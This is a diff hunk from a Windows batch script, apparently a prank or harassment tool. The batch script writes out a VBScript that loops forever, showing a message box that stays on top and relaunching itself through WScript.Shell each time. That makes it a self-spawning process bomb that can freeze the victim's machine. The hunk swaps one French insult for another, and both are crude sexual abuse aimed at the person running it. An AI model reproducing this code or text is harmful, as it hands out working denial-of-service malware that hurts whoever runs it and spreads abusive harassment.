@@ -168,7 +168,7 @@ set file=alerte_enculay.mp3
 
 
 @echo do>%prenom%.vbs
-@echo x=msgbox ("TU N'AS PLUS DE PAYCAY ENFANT DE H*PISTE, LE 15-18 T'A BIEN SODOMISÉ LE CUL" ,16+4096, "Cisla'wned :noel: :Y")>>%prenom%.vbs
+@echo x=msgbox ("LE 18-25 T'A BIEN BAISER LE FION PUTAIN DE GROS FILS DE PUTE" ,16+4096)>>%prenom%.vbs
 @echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
 @echo loop>>%prenom%.vbs
 
